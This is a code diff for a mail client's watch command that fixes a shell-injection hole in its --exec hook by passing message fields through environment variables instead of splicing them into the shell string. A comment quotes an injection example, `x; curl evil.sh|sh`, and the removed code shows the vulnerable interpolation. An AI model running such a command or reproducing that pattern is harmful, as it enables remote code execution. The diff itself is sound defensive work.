@@ -1,5 +1,5 @@
 import type { DatabaseSync } from "node:sqlite";
-import { spawn } from "node:child_process";
+import { spawn, type SpawnOptions } from "node:child_process";
 import { existsSync, readFileSync, unlinkSync, writeFileSync } from "node:fs";
 import type { JmapClient } from "./jmap.js";
 import { sync } from "./sync.js";
@@ -37,6 +37,104 @@ interface WatchRow {
   mailboxes: string | null;
 }
 
+// ---- --exec hooks -------------------------------------------------------
+//
+// SECURITY CONTRACT (do not weaken): the only thing `sh -c` ever parses is
+// the operator's own template. Message fields — every one of which is
+// attacker-controlled, since a stranger chooses the subject, display name
+// and body of the mail they send you — are handed to the hook through the
+// environment, where the shell copies them as opaque bytes and the
+// operator's quoting alone decides how they expand.
+//
+// The previous design interpolated the fields into the command string and
+// leaned on a character blocklist. That is remotely-triggered RCE whenever
+// the template leaves a placeholder outside double quotes (`--exec 'echo
+// {subject}'` + a subject of `x; curl evil.sh|sh`), because `;`, `|`, `&`,
+// `(`, `)`, `<`, `>` and newline all survived the filter. Escaping shell
+// metacharacters is not a winnable game; never reintroduce it.
+
+/** Message fields handed to a `--exec` hook as `BM_*` env vars. */
+export interface HookFields {
+  id: string;
+  account: string;
+  from: string;
+  subject: string;
+  preview: string;
+}
+
+/** `$BM_PREVIEW` is truncated so a huge body can't blow the env size limit. */
+export const HOOK_PREVIEW_MAX = 120;
+
+/** Placeholders the old, injectable contract substituted. Warn-only now. */
+const LEGACY_PLACEHOLDERS = ["{id}", "{from}", "{subject}", "{preview}"] as const;
+
+/** Which retired `{…}` placeholders a template still uses, if any. */
+export function legacyPlaceholders(template: string): string[] {
+  return LEGACY_PLACEHOLDERS.filter((p) => template.includes(p));
+}
+
+export interface HookPlan {
+  command: string;
+  args: string[];
+  options: SpawnOptions & { env: NodeJS.ProcessEnv };
+}
+
+/**
+ * Pure core of the hook: what we would hand to `spawn`.
+ *
+ * `args` is always exactly `["-c", template]` — the caller's template,
+ * byte-for-byte, with nothing spliced in.
+ */
+export function hookPlan(
+  template: string,
+  fields: HookFields,
+  opts: { json?: boolean; env?: NodeJS.ProcessEnv } = {},
+): HookPlan {
+  return {
+    command: "sh",
+    args: ["-c", template],
+    options: {
+      env: {
+        ...(opts.env ?? process.env),
+        BM_ID: fields.id,
+        BM_ACCOUNT: fields.account,
+        BM_FROM: fields.from,
+        BM_SUBJECT: fields.subject,
+        BM_PREVIEW: fields.preview.slice(0, HOOK_PREVIEW_MAX),
+      },
+      // Under --json our stdout is a data stream, so the hook must not get
+      // it: fd 2 routes the hook's stdout to our stderr instead. stdin is
+      // always closed — a hook must never steal the terminal.
+      stdio: ["ignore", opts.json ? 2 : "inherit", "inherit"],
+    },
+  };
+}
+
+/** Just enough of `ChildProcess` for the hook; lets tests pass a fake spawn. */
+export interface HookChild {
+  on(event: "error", listener: (err: Error) => void): unknown;
+}
+export type SpawnLike = (command: string, args: string[], options: SpawnOptions) => HookChild;
+
+/**
+ * Fire-and-forget: a slow hook must never stall the watch loop, so nothing
+ * awaits the child. Failures surface through `onError`.
+ */
+export function runHook(
+  template: string,
+  fields: HookFields,
+  opts: {
+    json?: boolean;
+    env?: NodeJS.ProcessEnv;
+    spawnFn?: SpawnLike;
+    onError?: (message: string) => void;
+  } = {},
+): void {
+  const plan = hookPlan(template, fields, opts);
+  const child = (opts.spawnFn ?? spawn)(plan.command, plan.args, plan.options);
+  child.on("error", (err) => opts.onError?.(`--exec failed: ${err.message}`));
+}
+
 export async function watch(
   db: DatabaseSync,
   client: JmapClient,
@@ -55,6 +153,20 @@ export async function watch(
   let stopping = false;
 
   const status = (msg: string) => console.error(`[watch] ${msg}`);
+
+  // Templates written against the old contract would otherwise fail
+  // silently (the literal `{subject}` reaches the shell). Say so once —
+  // and do NOT substitute: substitution is the vulnerability.
+  if (opts.exec) {
+    const stale = legacyPlaceholders(opts.exec);
+    if (stale.length > 0) {
+      status(
+        `--exec: ${stale.join(" ")} are no longer substituted (they were a shell-injection vector). ` +
+          `Use the environment instead: $BM_ID $BM_ACCOUNT $BM_FROM $BM_SUBJECT $BM_PREVIEW — ` +
+          `e.g. --exec 'notify-send "$BM_FROM: $BM_SUBJECT"'`,
+      );
+    }
+  }
 
   // One channel per account: its own socket, backoff, debounce, and sync
   // serialization — a burst on one inbox never blocks another's pushes.
@@ -175,18 +287,20 @@ export async function watch(
           `${mark} ${date}  ${acct}${from.padEnd(24).slice(0, 24)}  ${(row.subject || "(no subject)").slice(0, 48)}  [${row.mailboxes ?? ""}]  ${row.id}`,
         );
       }
-      if (opts.exec && event === "created") runHook(opts.exec, row, from);
+      if (opts.exec && event === "created") {
+        runHook(
+          opts.exec,
+          {
+            id: row.id,
+            account: accountLabel(ch.account),
+            from,
+            subject: row.subject,
+            preview: row.preview,
+          },
+          { json: opts.json, onError: status },
+        );
+      }
     }
-  }
-
-  function runHook(template: string, row: WatchRow, from: string): void {
-    const cmd = template
-      .replaceAll("{id}", row.id)
-      .replaceAll("{from}", shellSafe(from))
-      .replaceAll("{subject}", shellSafe(row.subject))
-      .replaceAll("{preview}", shellSafe(row.preview.slice(0, 120)));
-    const child = spawn("sh", ["-c", cmd], { stdio: "inherit" });
-    child.on("error", (err) => status(`--exec failed: ${err.message}`));
   }
 
   function connect(ch: Channel): void {
@@ -239,10 +353,6 @@ export async function watch(
   return new Promise<never>(() => {
     /* runs until signalled */
   });
-}
-
-function shellSafe(s: string): string {
-  return s.replaceAll(/[`$\\"']/g, "");
 }
 
 // Minimal structural type for Node's global (undici) WebSocket.
